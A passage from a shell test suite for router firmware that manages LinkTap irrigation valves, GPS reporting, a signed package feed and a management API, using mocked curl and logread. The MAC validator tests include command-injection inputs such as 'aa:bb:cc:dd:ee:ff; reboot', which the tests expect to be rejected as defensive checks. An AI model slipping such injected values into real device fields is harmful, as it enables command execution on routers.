rm -f "$_CURL_LOG" "$_SPOOL_T"

# unconfigured = strict no-op (every existing install)
_SPOOL_T=$(mktemp)
LINKTAP_HOST="" LINKTAP_GW_ID="" LINKTAP_DEV_IDS="" BRVG_RELAY_SPOOL="$_SPOOL_T" linktap_flood_close
check "no LinkTap config -> no-op, nothing spooled" "0" "$(wc -c < "$_SPOOL_T" | tr -d ' ')"
rm -f "$_SPOOL_T"

# --- gps_should_send (report-by-exception, Phase 3) ---
# Chicago-ish anchor point; a point ~180 m away for the "moved" cases.
_A_LAT=41.87811; _A_LON=-87.62980
_FAR_LAT=41.87811; _FAR_LON=-87.62760   # ~180 m east
GPS_DEADBAND_M=50; GPS_LIVENESS_SECS=1200
send_verdict() { if gps_should_send "$1" "$2" "$3"; then echo send; else echo skip; fi; }

GPS_LAST_LAT=""; GPS_LAST_LON=""; GPS_LAST_SENT=0
check "gps: first fix of the run always sends" "send" "$(send_verdict "$_A_LAT" "$_A_LON" 0)"

GPS_LAST_LAT=$_A_LAT; GPS_LAST_LON=$_A_LON; GPS_LAST_SENT=$(date +%s)
check "gps: parked, unarmed, unmoved, recent -> skip" "skip" "$(send_verdict "$_A_LAT" "$_A_LON" 0)"
check "gps: armed ALWAYS sends even when unmoved (the safety case)" "send" "$(send_verdict "$_A_LAT" "$_A_LON" 1734)"
check "gps: moved past the 50 m deadband -> send" "send" "$(send_verdict "$_FAR_LAT" "$_FAR_LON" 0)"

GPS_LAST_SENT=$(( $(date +%s) - 1300 ))   # older than the 1200 s liveness floor
check "gps: liveness floor elapsed -> send even when unmoved" "send" "$(send_verdict "$_A_LAT" "$_A_LON" 0)"

GPS_LAST_SENT=$(date +%s); GPS_DEADBAND_M=0   # RBE disabled
check "gps: deadband 0 disables RBE -> always send" "send" "$(send_verdict "$_A_LAT" "$_A_LON" 0)"
GPS_DEADBAND_M=50

# (The pass/fail summary used to sit HERE, part-way down the file — so every check below it could
# fail and the script still exited 0. It is at the bottom now.)

# --- LinkTap cycle semantics on hub-lite (parity port) -------------------------------------------
# These fixtures MIRROR hub/test/cycle.test.ts case for case — the one-contract rule. A case added
# there gets added here.

# lt_parse_status
out=$(printf '{"cmd":3,"dev_stat":[{"is_watering":1,"volume":0.63,"remain_duration":79940}]}' | lt_parse_status gal)
check "lt parse: watering, gal→L conversion (0.63 gal = 2.385 L)" "1 2.385 79940 0.000" "$out"
out=$(printf '{"is_watering":0,"volume":15886307.00}' | lt_parse_status gal)
check "lt parse: the idle garbage latch reads as no volume (absent remain is '-', never an empty field)" "0 0.000 - 0.000" "$out"
out=$(printf '<html><body><!--#RET-->{"is_watering":"1","volume":2,"remain_duration":60}</body></html>' | lt_parse_status L)
check "lt parse: HTML wrap + string flag + litre unit" "1 2.000 60 0.000" "$out"

# lt_decide — the decision table, mirroring cycle.test.ts
check "decide: idle + watering = adopt (manual press IS a Normal Run)" "adopt" "$(lt_decide idle 1 0.5 100 "" 0 86400)"
check "decide: idle + closed = none" "none" "$(lt_decide idle 0 0 100 "" 0 86400)"
check "decide: cap reached = cut" "cut" "$(lt_decide watering 1 100.2 100 "" 300 86400)"
check "decide: cap reached but stop already issued = none (no re-issue storm)" "none" "$(lt_decide watering 1 101 100 "volume_cap" 320 86400)"
check "decide: under the cap = none" "none" "$(lt_decide watering 1 50 100 "" 300 86400)"
check "decide: no cap (washdown shape) never cuts" "none" "$(lt_decide watering 1 5000 0 "" 300 7200)"
# The lead-time cutoff — mirrors daemon cycle.rs cutoff_trigger_l. Numbers measured on MVP
# 2026-08-22: 22.07 L/min (5.83 gal/min) x 8 s = ~2.94 L of overshoot.
check "decide: leads the cap by the stop latency (fires BELOW the cap when flowing)" "cut" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400 22.07)"
check "decide: same volume with NO speed does NOT cut early (degrades to old behaviour)" "none" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400 0)"
check "decide: speed arg omitted entirely still behaves as before" "none" \
  "$(lt_decide watering 1 35.0 37.85 "" 300 86400)"
check "decide: a trickle barely leads — 39 L under a 40 L cap at 1 L/min is not yet a cut" "none" \
  "$(lt_decide watering 1 38.7 40 "" 300 86400 1.0)"
check "decide: cap smaller than the overshoot cuts at the first sign of flow" "cut" \
  "$(lt_decide watering 1 0.1 1.0 "" 5 86400 22.07)"
check "decide: no cap still never cuts however fast it flows" "none" \
  "$(lt_decide watering 1 5000 0 "" 300 7200 22.07)"
check "decide: closed after our stop = ended:volume_cap" "ended:volume_cap" "$(lt_decide watering 0 100.5 100 "volume_cap" 350 86400)"
check "decide: THE BUG CASE — hardware cap stop inside one poll = ended:volume_cap, not timer" "ended:volume_cap" "$(lt_decide watering 0 100.3 100 "" 120 600)"
check "decide: closed within a minute of duration = ended:timer" "ended:timer" "$(lt_decide watering 0 40 100 "" 590 600)"
check "decide: early close, no explanation = ended:unknown" "ended:unknown" "$(lt_decide watering 0 5 100 "" 60 600)"
check "decide: flood stop classifies as flood_shutoff" "ended:flood_shutoff" "$(lt_decide watering 0 30 0 "flood_shutoff" 60 7200)"

# lt_should_restart — only a timer expiry restarts
lt_should_restart timer 1 && _r=yes || _r=no
check "restart: timer + enabled = yes" "yes" "$_r"
for reason in volume_cap manual flood_shutoff unknown; do
  lt_should_restart "$reason" 1 && _r=yes || _r=no
  check "restart: $reason never restarts" "no" "$_r"
done
lt_should_restart timer 0 && _r=yes || _r=no
check "restart: disabled means disabled" "no" "$_r"

# lt_start_body — cmd 6, duration seconds, volume_limit in the gateway unit
# lt_parse_status now emits: watering volume remain SPEED (speed in L/min, gal converted)
check "parse_status extracts speed and converts gal/min -> L/min" "1 15.142 270 22.069" \
  "$(printf '%s' '{"is_watering":true,"volume":4.0,"remain_duration":270,"speed":5.83}' | lt_parse_status gal)"
check "parse_status: absent speed is 0 (lead disabled, not corrupted)" "1 4.000 270 0.000" \
  "$(printf '%s' '{"is_watering":true,"volume":4.0,"remain_duration":270}' | lt_parse_status litre)"

check "lt_start_body shape" '{"cmd":6,"gw_id":"GW02","dev_id":"aaaabbbbccccdddd","duration":86400,"volume_limit":26.42}' \
  "$(lt_start_body GW02 aaaabbbbccccdddd 86400 26.42)"

# --- Wire profiles on hub-lite (config-as-state; mirrors the TS sender/runtime pair) --------------
REPLY='{"status":"ok","stored":2,"commands":[{"id":"c1","cmd":"report_now"}],"linktap":{"profiles":{"aaaabbbbccccdddd":{"durationSecs":7200,"volumeCapL":250.5,"autoRestart":true},"bbbbccccddddeeee":{"volumeCapL":50}}}}'

out=$(printf '%s' "$REPLY" | lt_parse_profiles)
check "wire profiles: full profile parses" "aaaabbbbccccdddd 7200 250.5 1" "$(printf '%s\n' "$out" | sed -n 1p)"
check "wire profiles: partial profile keeps '-' for unset fields (skip-don't-default)" \
  "bbbbccccddddeeee - 50 -" "$(printf '%s\n' "$out" | sed -n 2p)"

out=$(printf '{"status":"ok"}' | lt_parse_profiles)
check "wire profiles: reply without the blob parses to nothing" "" "$out"

# a later object-valued key must not be misread as a valve
out=$(printf '{"linktap":{"profiles":{"aaaabbbbccccdddd":{"volumeCapL":10}}},"other":{"x":{"volumeCapL":99}}}' | lt_parse_profiles)
check "wire profiles: the walk stops at the profiles-closing brace" "aaaabbbbccccdddd - 10 -" "$out"

# apply → per-valve files, then the tick's field-by-field override
_LT_T=$(mktemp -d)
LT_STATE_DIR="$_LT_T" lt_apply_profiles <<'EOP'
aaaabbbbccccdddd 7200 250.5 1
bbbbccccddddeeee - 50 -
EOP
check "apply: full profile file" "P_DUR=7200
P_VOL=250.5
P_AR=1" "$(cat "$_LT_T/profile.aaaabbbbccccdddd")"
check "apply: partial profile file carries only the set fields" "P_VOL=50" "$(cat "$_LT_T/profile.bbbbccccddddeeee")"

# effective profile: wire over conf, field by field (the profileFor rule)
P_DUR=""; P_VOL=""; P_AR=""
. "$_LT_T/profile.bbbbccccddddeeee"
_dur="${P_DUR:-86400}"; _capL="${P_VOL:-378}"; _ar="${P_AR:-0}"
check "effective: wire cap wins" "50" "$_capL"
check "effective: unset duration falls to the conf default" "86400" "$_dur"
check "effective: unset autoRestart falls to the conf default" "0" "$_ar"
rm -rf "$_LT_T"

# --- The daily ledger on hub-lite (parity port of cycle.ts applyToLedger) -------------------------
_LD=$(mktemp -d)
_LF="$_LD/ledger.aaaabbbbccccdddd"

out=$(lt_ledger_apply normal 40 2026-08-19 "$_LF")
check "ledger: first normal run starts the day" "40.00" "$out"
out=$(lt_ledger_apply tankfill 60 2026-08-19 "$_LF")
check "ledger: tank fill accumulates" "100.00" "$out"

# Owner rule: washdown does NOT count against the daily value.
out=$(lt_ledger_apply washdown 500 2026-08-19 "$_LF")
check "ledger: washdown contributes NOTHING" "100.00" "$out"

# ...but it still rolls the day, so tomorrow's first run cannot resume yesterday's total.
out=$(lt_ledger_apply washdown 500 2026-08-20 "$_LF")
check "ledger: a washdown on a new day rolls the date and stays zero" "0.00" "$out"
out=$(lt_ledger_apply normal 25 2026-08-20 "$_LF")
check "ledger: the new day accumulates from zero, not from yesterday" "25.00" "$out"

# A brand-new valve (no file yet) starts clean.
out=$(lt_ledger_apply normal 12.5 2026-08-20 "$_LD/ledger.newvalve")
check "ledger: an unseen valve starts at its own first run" "12.50" "$out"

check "ledger: day keys are UTC ISO dates" "$(date -u +%F)" "$(lt_day_key)"
rm -rf "$_LD"

# --- LAN management door: valid_mac (hub-lite-mgmt.sh POST ?action=lockdown) ---
# This is what replaces "the app SSHes a generated uci script in as root", so the interesting
# cases are the ones that must NOT reach a uci argument.
check "mac: a plain lowercase address" "0" "$(valid_mac 'aa:bb:cc:dd:ee:ff'; echo $?)"
check "mac: uppercase is equally valid" "0" "$(valid_mac 'AA:BB:CC:DD:EE:FF'; echo $?)"
check "mac: mixed case, digits" "0" "$(valid_mac '3C:1e:04:AB:90:7f'; echo $?)"
check "mac: empty string rejected" "1" "$(valid_mac ''; echo $?)"
check "mac: too short rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee'; echo $?)"
check "mac: too long rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee:ff:00'; echo $?)"
check "mac: hyphen form rejected (uci wants colons)" "1" "$(valid_mac 'aa-bb-cc-dd-ee-ff'; echo $?)"
check "mac: non-hex rejected" "1" "$(valid_mac 'zz:bb:cc:dd:ee:ff'; echo $?)"
check "mac: a command substitution is not a MAC" "1" "$(valid_mac 'aa:bb:cc:dd:ee:ff; reboot'; echo $?)"
check "mac: a semicolon anywhere is fatal" "1" "$(valid_mac ';reboot'; echo $?)"
check "mac: whitespace rejected" "1" "$(valid_mac 'aa:bb:cc:dd:ee:f '; echo $?)"

# --- LAN management door: state_pairs ---
# The CGI serves this verbatim as JSON, so the encoding has to survive the app's parser
# (parseCachedModem) and must never emit an unescaped quote.
out=$(state_pairs "modem.measurement" "up=1&mode=LTE&rsrp=-104&carrier=T-Mobile")
check "state: a plain report becomes quoted pairs" '"up":"1","mode":"LTE","rsrp":"-104","carrier":"T-Mobile"' "$out"

out=$(state_pairs "modem.measurement" "carrier=T%20Mobile%20US")
check "state: %20 comes back as a space, as the worker decodes it" '"carrier":"T Mobile US"' "$out"

out=$(state_pairs "modem.measurement" "up=1&empty=&=novalue&mode=LTE")
check "state: half-pairs are dropped rather than emitted broken" '"up":"1","mode":"LTE"' "$out"

out=$(state_pairs "modem.measurement" 'carrier=A"B\C')
check "state: quotes and backslashes are stripped, never emitted raw" '"carrier":"ABC"' "$out"

out=$(state_pairs "modem.measurement" "")
check "state: an empty report emits nothing at all" "" "$out"

# write_state must produce ONE parseable object, and must not leave its temp file behind.
_SD=$(mktemp -d)
HUB_LITE_STATE="$_SD/state"
write_state "modem.measurement" "up=1&rsrp=-104"
out=$(cat "$HUB_LITE_STATE")
case "$out" in
  '{"v":1,"event":"modem.measurement","ts":'*',"av":"'*'","up":"1","rsrp":"-104"}') r=ok ;;
  *) r="$out" ;;
esac
check "write_state: one object, version + timestamp + the reported values" "ok" "$r"
check "write_state: no temp file left behind" "1" "$(ls "$_SD" | wc -l | tr -d ' ')"
rm -rf "$_SD"

# --- state_pairs must not duplicate `av` (real bench capture, 2026-08-21) ---
# write_state puts `av` in the object header, and push_modem's param string carries it too, so the
# first live capture off the GL-X750 had TWO "av" keys in one object.
out=$(state_pairs "modem.measurement" "up=1&av=0.14.1&rsrp=-107")
check "state: av is dropped from the params — the header already has it" '"up":"1","rsrp":"-107"' "$out"

_SD2=$(mktemp -d)
HUB_LITE_STATE="$_SD2/state"
write_state "modem.measurement" "up=1&av=9.9.9&rsrp=-107"
check "write_state: exactly one av in the object" "1" "$(tr ',' '\n' < "$HUB_LITE_STATE" | grep -c '"av"')"
check "write_state: and it is the header's version, not the param's" "1" "$(grep -c "\"av\":\"$HUB_LITE_VERSION\"" "$HUB_LITE_STATE")"
rm -rf "$_SD2"

# ── The /api/hub/* door (owner ruling 2026-08-31: "move to 8722, keep one contract") ────────────
#
# A hub-lite now answers the SAME paths as the Rust daemon, so the app has one hub client rather
# than a second ?action= dialect. These pin the contract, because a shape mismatch here is not a
# hub-lite bug — it is the app silently treating a live hub as absent.
# (The 0.14.x api cases lived here, against a hand-made conf with `VEHICLE_ID=` and a state-file
# format nothing writes — which is how four broken routes passed. They are rewritten against the REAL
# conf keys and the REAL state below, in the 0.15.0 section.)

# ── Washdown on hub-lite (owner: "washdown after") ──────────────────────────────────────────────
#
# 🔴 THE RESTART GUARD IS THE SAFETY ONE. The daemon requires mode == Normal to auto-restart
# (cycle.rs should_auto_restart); this tier checked reason and the switch only. Latent while it ran
# Normal Runs exclusively — a live water-safety bug the moment washdown exists, because a washdown
# ending on its own timer would restart as ANOTHER washdown, uncapped, forever.
lt_should_restart timer 1 normal   && check "restart: a Normal Run timer expiry restarts" "1" "1"
lt_should_restart timer 1 washdown && check "restart: A WASHDOWN MUST NOT RESTART" "never" "reached" || \
  check "restart: A WASHDOWN MUST NOT RESTART" "1" "1"
lt_should_restart timer 1 tankfill && check "restart: a tank fill must not restart either" "never" "reached" || \
  check "restart: a tank fill must not restart either" "1" "1"
lt_should_restart timer 1 ""       && check "restart: a state file with no mode is a Normal Run" "1" "1"
lt_should_restart volume_cap 1 normal && check "restart: a volume cap must not restart" "never" "reached" || \
  check "restart: a volume cap must not restart" "1" "1"
lt_should_restart timer 0 normal && check "restart: the switch still governs" "never" "reached" || \
  check "restart: the switch still governs" "1" "1"

# A washdown is TIME-ONLY: cap 0 disables the cutoff, so no volume can end it.
out=$(lt_decide watering 1 999999 0 "" 10 300 5)
check "washdown: no volume cuts a cap-less run" "none" "$out"
out=$(lt_decide watering 0 999999 0 "" 300 300 0)
check "washdown: it ends on its TIMER, whatever the volume" "ended:timer" "$out"

# The ledger: a washdown contributes nothing but still rolls the day.
_ldir=$(mktemp -d 2>/dev/null || echo /tmp/brvg-ldg.$$); mkdir -p "$_ldir"
out=$(lt_ledger_apply washdown 500 2026-09-01 "$_ldir/l")
check "ledger: a washdown adds nothing" "0.00" "$out"
out=$(lt_ledger_apply normal 40 2026-09-01 "$_ldir/l")
check "ledger: a Normal Run after it still counts from zero" "40.00" "$out"
rm -rf "$_ldir"

# ── The persisted cycle must actually load ──────────────────────────────────────────────────────
#
# 🔴 IT DID NOT, AND THE COST WAS THE VOLUME CUTOFF. The state file writes `state=` and the machine
# reads `_state`; sourcing sets the UNPREFIXED name, so _state was `idle` on EVERY tick. lt_decide
# only evaluates the software cutoff on the `_prev != idle` branch, so it returned `adopt` forever
# and the cutoff never fired — on the tier whose own comment calls it "the only volume enforcement
# there is", because the hardware ignores volume_limit. A hub-lite vessel had no volume bound on its
# water at all; only the duration ceiling ever stopped a run.
_lsdir=$(mktemp -d 2>/dev/null || echo /tmp/brvg-ls.$$); mkdir -p "$_lsdir"

printf 'state=watering\nstarted=1700000000\nstop=volume_cap\nmode=washdown\ndur=300\ncap=0\n' > "$_lsdir/a"
lt_load_state "$_lsdir/a" 86400 378
check "load: a watering valve reads as WATERING, not idle" "watering" "$_state"
check "load: started survives (elapsed was measured from epoch 0)" "1700000000" "$_started"
check "load: stop_issued survives, so a cut is not re-issued every tick" "volume_cap" "$_stop"
check "load: the run's own mode survives" "washdown" "$_mode"
check "load: and its own targets beat the profile's" "300 0" "$_dur_eff $_cap_eff"

# The end-to-end consequence: a NORMAL run past its cap must now reach the cutoff branch at all.
printf 'state=watering\nstarted=1700000000\nstop=\nmode=normal\ndur=86400\ncap=378\n' > "$_lsdir/b"
lt_load_state "$_lsdir/b" 86400 378
out=$(lt_decide "$_state" 1 400 "$_cap_eff" "$_stop" 100 "$_dur_eff" 0)
check "load: THE VOLUME CUTOFF FIRES — 400L past a 378L cap" "cut" "$out"

# A file with no mode/dur/cap is a Normal Run on the profile — what every older file meant.
printf 'state=watering\nstarted=1700000000\nstop=\n' > "$_lsdir/c"
lt_load_state "$_lsdir/c" 86400 378
check "load: an older state file is a Normal Run on the profile" "normal 86400 378" "$_mode $_dur_eff $_cap_eff"

# Absent file: idle, and no inherited values from the valve before it in the loop.
lt_load_state "$_lsdir/nope" 86400 378
check "load: no file means idle" "idle" "$_state"
check "load: and nothing leaks in from the previous valve" "normal 86400 378 0 " "$_mode $_dur_eff $_cap_eff $_started $_stop"
rm -rf "$_lsdir"

# --- feed-setup: the signed-feed provisioner --------------------------------------------------
# feed-setup.sh writes an absolute /etc/opkg tree, so run it against a sandbox root by rewriting
# that prefix. What matters: the trust anchor lands under the fingerprint opkg looks up, the
# customfeeds line is present exactly once however many times it runs, and an unrelated feed line
# already in the file survives.
_fsroot=$(mktemp -d)
sed "s#/etc/opkg#$_fsroot/etc/opkg#g" "$HL_DIR/package/feed-setup.sh" > "$_fsroot/fs.sh"
sh "$_fsroot/fs.sh" >/dev/null 2>&1
sh "$_fsroot/fs.sh" >/dev/null 2>&1   # twice — the interesting case is idempotency
printf 'src/gz openwrt_core https://downloads.openwrt.org/x\n' >> "$_fsroot/etc/opkg/customfeeds.conf"
sh "$_fsroot/fs.sh" >/dev/null 2>&1
check "feed-setup: exactly one brvg feed line after three runs" "1" "$(grep -c 'brvg_hublite' "$_fsroot/etc/opkg/customfeeds.conf")"
check "feed-setup: an unrelated feed line is preserved" "1" "$(grep -c 'openwrt_core' "$_fsroot/etc/opkg/customfeeds.conf")"
check "feed-setup: the trust anchor is named by the committed key's fingerprint" "yes" "$([ -f "$_fsroot/etc/opkg/keys/b0ff2bec314c57d3" ] && echo yes || echo no)"
check "feed-setup: the installed key is byte-identical to the committed public key" "same" "$(cmp -s "$_fsroot/etc/opkg/keys/b0ff2bec314c57d3" "$HL_SRC/package/brvg-feed.pub" && echo same || echo differ)"
# The fingerprint in feed-setup.sh MUST match the committed key — a mismatch means opkg looks up a
# key file that verification will never find. Recompute it from the key blob the way usign does is
# out of scope for a pure-shell test, so assert the two constants agree with each other instead.
check "feed-setup: its fingerprint constant matches the key filename it writes" "b0ff2bec314c57d3" "$(sed -n 's/^KEY_FINGERPRINT="\([^"]*\)".*/\1/p' "$HL_DIR/package/feed-setup.sh")"
rm -rf "$_fsroot"

# ═════════════════════════════════════════════════════════════════════════════════════════════════
# 0.15.0 — daemon parity, slices 1-3 (hub-lite-parity.md). Everything below uses the REAL conf keys
# and the REAL state the collector writes.
# ═════════════════════════════════════════════════════════════════════════════════════════════════
T=$(mktemp -d)
mkdir -p "$T/bin" "$T/lt"
# A PATH shim for the CGIs, which run as separate processes and so cannot see a shell function. It
# logs every call and answers like a GL-X750's gateway, the worker, logread and `ip` would.
cat > "$T/bin/curl" <<'SHIM'
#!/bin/sh
body=""; prev=""; out=""; fmt=""
for a in "$@"; do
  case "$prev" in -d) body="$a" ;; -o) out="$a" ;; -w) fmt="$a" ;; esac
  prev="$a"
done
eval "url=\${$#}"
printf '%s %s\n' "$url" "$body" >> "$SHIM_LOG"
rc=$(cat "$SHIM_RC" 2>/dev/null || echo 0)
[ "$rc" = "0" ] || exit "$rc"
case "$body" in
  *'"cmd":16'*) reply='{"vol_unit":"L"}' ;;
  *'"cmd":3'*) reply=$(cat "$SHIM_CMD3" 2>/dev/null) ;;
  *) reply='{"ret":0}' ;;
esac
if [ -n "$out" ]; then printf '%s' "$reply" > "$out"; else printf '%s' "$reply"; fi
[ -n "$fmt" ] && printf '200'
exit 0
SHIM
cat > "$T/bin/logread" <<'SHIM'
#!/bin/sh
echo "Sat Sep 13 brvg-hub-lite: management key stored"
echo "Sat Sep 13 brvg-hub-lite: send failed url=https://w/api/agent?vid=v&t=tok_SECRET_0123456789&x=1"
echo "Sat Sep 13 brvg-hub-lite: key is 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
echo "Sat Sep 13 dnsmasq: unrelated"
SHIM
cat > "$T/bin/ip" <<'SHIM'
#!/bin/sh
echo "    inet 192.168.8.1/24 brd 192.168.8.255 scope global br-lan"
SHIM
chmod +x "$T/bin/curl" "$T/bin/logread" "$T/bin/ip"
SHIM_LOG="$T/curl.log"; SHIM_RC="$T/curl.rc"; SHIM_CMD3="$T/cmd3"
export SHIM_LOG SHIM_RC SHIM_CMD3

KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
DEV=aaaabbbbccccdddd
write_conf() {
  cat > "$T/conf" <<CONF
VID="v_test"
DEVICE_ID="brv_net_test"
DEVICE_TOKEN="tok_SECRET_0123456789"
WORKER_URL="https://api.example.test"
MGMT_KEY=$KEY
LINKTAP_HOST=192.168.8.50
LINKTAP_GW_ID=GW02
LINKTAP_DEV_IDS=$DEV
LINKTAP_ALLOWED=1
LINKTAP_NORMAL_VOL_L=378
CONF
}
write_conf
# One CGI call. $1 method, $2 PATH_INFO, $3 body, then extra VAR=value environment.
api() {
  _m="$1"; _p="$2"; _b="$3"; shift 3
  printf '%s' "$_b" | env PATH="$T/bin:$PATH" REQUEST_METHOD="$_m" PATH_INFO="$_p" CONTENT_LENGTH="${#_b}" \
    HTTP_AUTHORIZATION="Bearer $KEY" BRVG_HUB_LITE_CONF="$T/conf" BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" \
    BRVG_LT_STATE_DIR="$T/lt" BRVG_RELAY_SPOOL="$T/spool" BRVG_HUB_LITE_STARTED="$T/started" \
    BRVG_HUB_LITE_RELOAD="$T/reload" BRVG_HUB_LITE_UPDATE="$T/update" BRVG_REPORT_CGI="$HL_DIR/hub-lite-cgi.sh" \
    REMOTE_ADDR="${REMOTE:-192.168.8.20}" "$@" sh "$HL_DIR/hub-lite-api.sh" 2>/dev/null
}
status_of() { printf '%s' "$1" | sed -n 's/^Status: \([0-9]*\).*/\1/p' | head -1; }
body_of() { printf '%s' "$1" | tr -d '\r' | sed '1,/^$/d'; }
date +%s > "$T/started"

echo ""
echo "# --- slice 1: the door is real and safe --------------------------------------------------"
r=$(api GET /ping "")
check "ping: version is read from HUB_LITE_VERSION (B3), not '0'" "1" "$(body_of "$r" | grep -c "\"version\":\"$HUB_LITE_VERSION\"")"
check "ping: registered reads VID + the token (B2), not VEHICLE_ID" "1" "$(body_of "$r" | grep -c '"registered":true')"
check "ping: still admits it is a lite hub" "1" "$(body_of "$r" | grep -c '"lite":true')"
check "ping: a claimed router is never adoptable" "1" "$(body_of "$r" | grep -c '"adoptable":false')"
r=$(api GET /status "")
check "status: requires nothing but the router's MGMT_KEY (B1) and answers" "200" "$(status_of "$r")"
check "status: vid comes from VID (B2)" "1" "$(body_of "$r" | grep -c '"vid":"v_test"')"
check "status: hubId is DEVICE_ID" "1" "$(body_of "$r" | grep -c '"hubId":"brv_net_test"')"
check "status: linktap claimed with the plan's permission and a gateway" "1" "$(body_of "$r" | grep -c '"capabilities":\["linktap"')"
check "status: the daemon's always-present arrays are present" "1" "$(body_of "$r" | grep -c '"routers":\[\],"sensors":\[\]')"
check "status: no secret ingest armed without SHELLY_SECRET" "1" "$(body_of "$r" | grep -c '"shellyIngestArmed":false')"
check "status: a GL-MT300N-V2 with no modem port does not claim modem_at" "0" "$(body_of "$r" | grep -c 'modem_at')"
check "status: anchor_local (D5) is claimed — the collector always runs it" "1" "$(body_of "$r" | grep -c '"anchor_local"')"
r=$(api GET /status "" HTTP_AUTHORIZATION="Bearer wrong")
check "status: a wrong key is 401" "401" "$(status_of "$r")"
check "status: and the Status line carries its reason phrase (uhttpd ignores a bare code)" "1" "$(printf '%s' "$r" | grep -c '^Status: 401 Unauthorized')"
sed '/^MGMT_KEY=/d' "$T/conf" > "$T/conf.nokey"
r=$(api GET /linktap/state "" BRVG_HUB_LITE_CONF="$T/conf.nokey")
check "state: 503 while the router has no MGMT_KEY yet" "503" "$(status_of "$r")"
r=$(api GET /linktap/state "" HTTP_AUTHORIZATION="")
check "state: 401 without a Bearer (valve state is not public on the LAN — B6)" "401" "$(status_of "$r")"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}" HTTP_AUTHORIZATION="")
check "valve: 401 without a Bearer" "401" "$(status_of "$r")"
r=$(api POST /nope "")
check "api: an unknown verb is a real 404" "404" "$(status_of "$r")"

# 🔴 B5, THE WATER-SAFETY ONE. A washdown opened through the door must be seen by the poll as the SAME
# run: never adopted, never volume-cut, however much water the meter reports.
: > "$SHIM_LOG"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"mode\":\"washdown\",\"durationSecs\":7200,\"resumeNormal\":true}")
check "B5: the washdown open is accepted" "200" "$(status_of "$r")"
check "B5: the run record lands in the collector's state dir, not /tmp/<dev>" "yes" "$([ -f "$T/lt/$DEV" ] && echo yes || echo no)"
check "B5: it records THIS run — washdown, time-only, ours, told to resume" "washdown 0 hub 1" \
  "$(. "$T/lt/$DEV"; echo "$mode $cap $prov $resume")"
check "B5: a washdown start carries NO volume_limit to the gateway" "0" "$(grep '"cmd":6' "$SHIM_LOG" | grep -c volume_limit)"
check "B5: the door rang the poll loop" "yes" "$([ -f "$T/lt/wake" ] && echo yes || echo no)"
(
  LT_STATE_DIR="$T/lt"; BRVG_RELAY_SPOOL="$T/spool"; CONF="$T/conf"
  # shellcheck disable=SC1090
  . "$T/conf"
  PATH="$T/bin:$PATH"
  unset -f curl 2>/dev/null
  printf '{"dev_stat":[{"dev_id":"%s","is_watering":1,"volume":500,"remain_duration":7000,"speed":20}]}' "$DEV" > "$SHIM_CMD3"
  : > "$SHIM_LOG"
  linktap_tick
  echo "cut=$(grep -c '"cmd":7' "$SHIM_LOG")" > "$T/b5"
  . "$T/lt/$DEV"
  echo "run=$mode/$prov/$cap/$stop" >> "$T/b5"
)
check "B5: 500 L past a 378 L profile cap — the poll issues NO stop on the washdown" "cut=0" "$(sed -n 1p "$T/b5")"
check "B5: and the run is still the washdown we opened, not an adopted Normal Run" "run=washdown/hub/0/" "$(sed -n 2p "$T/b5")"
check "B5: the measurement names it as ours" "1" "$(grep -c "prov=hub" "$T/lt/meas.$DEV")"

# The sibling hole: a Normal Run opened WITHOUT volumeCapL used to be tracked as cap 0 — no cutoff.
rm -f "$T/lt/$DEV"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":3600}")
check "normal open without volumeCapL tracks the PROFILE cap, never 0" "normal 378 hub" "$(. "$T/lt/$DEV"; echo "$mode $cap $prov")"
(
  LT_STATE_DIR="$T/lt"; BRVG_RELAY_SPOOL="$T/spool"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
  printf '{"is_watering":1,"volume":400}' > "$SHIM_CMD3"; : > "$SHIM_LOG"
  linktap_tick
  echo "$(grep -c '"cmd":7' "$SHIM_LOG") $(. "$T/lt/$DEV"; echo "$stop")" > "$T/cut"
)
check "normal open: the software cutoff then fires at the cap" "1 volume_cap" "$(cat "$T/cut")"

# The plan gate: opens need the cloud's permission; closes never do.
sed 's/^LINKTAP_ALLOWED=1/LINKTAP_ALLOWED=0/' "$T/conf" > "$T/conf.noplan"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":60,\"volumeCapL\":10}" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: an open on an unpermitted plan is 402" "402" "$(status_of "$r")"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: a CLOSE is never refused for the plan" "200" "$(status_of "$r")"
check "close: marks the running cycle stop=manual, keeping its identity" "manual normal" "$(. "$T/lt/$DEV"; echo "$stop $mode")"
r=$(api GET /status "" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: no linktap capability without permission" "0" "$(body_of "$r" | grep -c '"linktap"')"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"mode\":\"washdown\",\"durationSecs\":60,\"volumeCapL\":10}")
check "valve: washdown + volumeCapL is refused, like the daemon" "422" "$(status_of "$r")"
r=$(api POST /linktap/valve '{"devId":"ffffeeeeddddcccc","action":"close"}')
check "valve: an unconfigured valve is 404" "404" "$(status_of "$r")"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\"}")
check "valve: an open with no duration is 422" "422" "$(status_of "$r")"

r=$(api GET /linktap/state "")
check "state: serves the collector's real measurement" "1" "$(body_of "$r" | grep -c "\"devId\":\"$DEV\",\"watering\":\"1\"")"
check "state: rev is the collector's revision counter" "1" "$(body_of "$r" | grep -c '"rev":[1-9]')"
rm -f "$T/lt/meas.$DEV"
r=$(api GET /linktap/state "")
check "state: a valve with no measurement yet is OMITTED, not invented as closed" "1" "$(body_of "$r" | grep -c '"valves":\[\]')"

echo ""
echo "# --- slice 1: spool bound, drain decoupled, classification --------------------------------"
